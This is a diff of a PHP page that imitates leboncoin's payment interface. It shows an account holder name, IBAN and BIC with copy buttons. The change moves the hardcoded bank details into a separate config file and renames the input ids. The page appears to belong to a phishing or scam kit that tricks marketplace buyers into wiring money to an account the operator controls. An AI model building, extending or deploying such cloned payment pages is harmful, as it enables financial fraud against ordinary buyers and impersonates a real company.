@@ -1,7 +1,5 @@
 <?php
-	$Titulaire 	= "test test - leboncoin";
-	$IBAN		= "FR66 2193 3000 01PQ BG5B SWYK 295";
-	$BIC		= "MPAYFRP1XXX";
+	include 'config.php';
 ?>
 <html lang="fr"><head><style>
 		._2qvLx
@@ -838,7 +836,7 @@
 												<div class="aj3_W _3oSnu _2x733 _3-ME7 _3Hrjq _1pJw9 _1hnil _1-TTU _3j0OU">
 													<?php echo $Titulaire; ?>
 												</div>
-												<input type="hidden" value="<?php echo $Titulaire; ?>" id="test test - leboncoin">
+												<input type="hidden" value="<?php echo $Titulaire; ?>" id="idTitulaire">
 												<div class="styles_copy__2EEL4">
 													<button class="_3pyiB _35pAC _1Vw3w _2fBkv _3OFYf _30q3D _1y_ge _3QJkO" onclick="copyTitulaire()" type="button">
 														<svg viewBox="0 0 14 14" class="sc-bdVaJa src___StyledBox-fochin-0 eAspbR">
@@ -857,7 +855,7 @@
 												<div class="aj3_W _3oSnu _2x733 _3-ME7 _3Hrjq _1pJw9 _1hnil _1-TTU _3j0OU">
 													<?php echo $IBAN; ?>
 												</div>
-												<input type="hidden" value="<?php echo $IBAN; ?>" id="FR66 2193 3000 01PQ BG5B SWYK 295">
+												<input type="hidden" value="<?php echo $IBAN; ?>" id=idIBAN>
 												<div class="styles_copy__2EEL4">
 													<button class="_3pyiB _35pAC _1Vw3w _2fBkv _3OFYf _30q3D _1y_ge _3QJkO" onclick="copyIBAN()" type="button">
 														<svg viewBox="0 0 14 14" class="sc-bdVaJa src___StyledBox-fochin-0 eAspbR">
@@ -876,7 +874,7 @@
 												<div class="aj3_W _3oSnu _2x733 _3-ME7 _3Hrjq _1pJw9 _1hnil _1-TTU _3j0OU">
 													<?php echo $BIC; ?>
 												</div>
-												<input type="hidden" value="<?php echo $BIC; ?>" id="MPAYFRP1XXX">
+												<input type="hidden" value="<?php echo $BIC; ?>" id="idBIC">
 												<div class="styles_copy__2EEL4">
 													<button class="_3pyiB _35pAC _1Vw3w _2fBkv _3OFYf _30q3D _1y_ge _3QJkO" onclick="copyBIC()" type="button">
 														<svg viewBox="0 0 14 14" class="sc-bdVaJa src___StyledBox-fochin-0 eAspbR">
